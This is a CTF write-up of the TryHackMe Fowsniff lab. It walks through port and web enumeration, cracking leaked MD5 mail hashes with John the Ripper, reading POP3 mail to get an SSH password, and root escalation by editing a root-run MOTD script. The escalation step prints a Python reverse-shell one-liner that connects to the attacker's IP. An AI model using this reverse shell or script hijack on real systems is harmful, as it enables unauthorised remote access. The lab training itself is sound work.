# TryHackMe: Fowsniff CTF Writeup
###### tags: `OSCP` `THM`

![THM easy room Fowniff CTF image](https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg)

[Play](https://tryhackme.com/room/ctf)

## 1. Scanning & Enumeration
We do the below scans in parallel.

### 1.1. Port Scanning
```
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES TOP USER SASL(PLAIN) AUTH-RESP-CODE UIDL CAPA PIPELINING
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 Pre-login LITERAL+ LOGIN-REFERRALS more have SASL-IR OK capabilities listed IDLE IMAP4rev1 ENABLE post-login ID
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Info gathered:
- SSH open
- port 80 serving http, we'll explore it below
- POP3 port open, which means we are going to dig into employee e-mails XD

### 1.2. Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt,zip' -t 64 -q -u 10.10.115.96
/images               (Status: 301) [Size: 313] [--> http://10.10.115.96/images/]
/index.html           (Status: 200) [Size: 2629]                                 
/security.txt         (Status: 200) [Size: 459]                                  
/assets               (Status: 301) [Size: 313] [--> http://10.10.115.96/assets/]
/README.txt           (Status: 200) [Size: 1288]                                 
/robots.txt           (Status: 200) [Size: 26]                                   
/LICENSE.txt          (Status: 200) [Size: 17128]                                
/server-status        (Status: 403) [Size: 300]                
```

Info gathered:
- `security.txt` looks interesting
- `robots.txt` is usually very helpful
- `/assets/` could contain shady javascript files

### 1.3. Web Exploration
![Fowsniff CTF Corp](https://i.imgur.com/kibWSYW.jpg)

They mention some kind of breach, and something related to their official twitter account.

Looking at the source code, we find a script commented out. 

`<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->`

This may hint at something, and we may want to look at it later on.

For now, let's see the `.txt` files. We see,
![fowsniff corp pw3nd by B1gN1nj4](https://i.imgur.com/4wHmBbA.png)

amazing XD

### 1.4. Exploring POP3 Service
```
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.115.96 110
Trying 10.10.115.96...
Connected to 10.10.115.96.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
```

We use telnet and specify the port. We see that it is a corporate mail server. Note the website mentions breach of employee usernames and passwords, so maybe we can try to login here.

### 1.5. Internet Exploration: Googling
Doing some Googling, we find:
![twitter page of fowsniff corp hacked](https://i.imgur.com/doAgpUu.jpg)

The first tweet mentiones a link to a pastebin,
```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:{hidden}
mustikka@fowsniff:{hidden}
tegel@fowsniff:{hidden}
{hidden-username}@fowsniff:{hidden}
seina@fowsniff:{hidden}
stone@fowsniff:{hidden}
mursten@fowsniff:{hidden}
parede@fowsniff:{hidden}
sciana@fowsniff:{hidden}
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4
```

So we get some interesting information:
- POP3 open (as we already explored)
- The hashes are MD5
- Since these are email passwords, we can login to POP3 :D


### 1.6. Hash Cracking: JtR
I pasted the username password combinations in a `data` file on my machine, and used the tool: John the Ripper to crack the MD5 hashes.

```
┌──(kali㉿kali)-[/tmp]
└─$ john data --format="Raw-MD5" --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
{hidden}    (seina@fowsniff)
{hidden}    (parede@fowsniff)
{hidden}    (tegel@fowsniff)
{hidden}    (baksteen@fowsniff)
{hidden}    (mauer@fowsniff)
{hidden}    (sciana@fowsniff)
{hidden}    (mursten@fowsniff)
{hidden}    (mustikka@fowsniff)
8g 0:00:00:03 DONE (2021-06-07 22:08) 2.631g/s 4718Kp/s 4718Kc/s 12066KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

### 1.7. Exploiting POP3 Service

Using some help from [this website](https://www.shellhacks.com/retrieve-email-pop3-server-command-line/) we get the commands. Feel free to explore more. 


```
┌──(kali㉿kali)-[/tmp]
└─$ telnet 10.10.115.96 110
Trying 10.10.115.96...
Connected to 10.10.115.96.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS {hidden}
+OK Logged in.
STAT
+OK 2 2902
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "{hidden}"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
RETR 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.

```
PS: if you have trouble logging out of this weird thing, read the help message on the top :D

## 2. Foothold
From the first email, we get: `The temporary password for SSH is "{hidden}"`

We can now login using SSH :)

Using the credentials we got - both the username and password, 
```
┌──(kali㉿kali)-[/tmp]
└─$ ssh {hidden-username}@10.10.115.96 
{hidden-username}@10.10.115.96's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
{hidden-username}@fowsniff:~$ 
```

We are in!


## 3. PrivEsc
The room hints us to look at the files owned by the group. Using `find / -type f -group users`, we get a file on the top named: ` /opt/cube/cube.sh`

Exploring more, we get the following file.
```
{hidden-username}@fowsniff:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#    {truncated}
#

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```

This means that as soon as you connect to ssh, the `update-motd.d` file is run, and the banner, stored in `/opt/cube/cube.sh` is shown to you. 

Since we found this *because* we are in this group, we can edit this. This means we can now put in a reverse shell. From [Reverse Shell Generator](https://www.revshells.com/),

`export RHOST="{MY_IP}";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`

And ...
![getting root on fowsniff ctf exploiting motd.d](https://i.imgur.com/KXBPVdy.png)

System compromised!
